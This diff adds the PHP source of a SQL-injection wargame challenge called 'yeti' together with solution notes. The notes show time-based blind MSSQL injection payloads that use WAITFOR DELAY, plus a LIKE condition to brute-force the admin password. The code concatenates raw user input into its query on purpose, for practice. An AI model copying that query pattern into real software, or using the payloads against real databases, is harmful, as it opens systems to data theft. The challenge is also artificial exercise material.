@@ -1,0 +1,24 @@
+<?php
+  include "./config.php";
+  login_chk();
+  $db = mssql_connect("yeti");
+  if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit("No Hack ~_~");
+  if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  sqlsrv_query($db,$query);
+
+  $query = "select pw from prob_yeti where id='admin'"; 
+  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
+  if($result['pw'] === $_GET['pw']) solve("yeti"); 
+  highlight_file(__FILE__);
+?>
+
+Time-based Blind injection.
+
+Check if sleep injection works:
+query : select id from prob_yeti where id='admin' and pw='' if (1=1) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'--'
+
+Brute query:
+query : select id from prob_yeti where id='admin' and pw='' if ((select pw from prob_yeti where id='admin') like '%') WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'--'
+
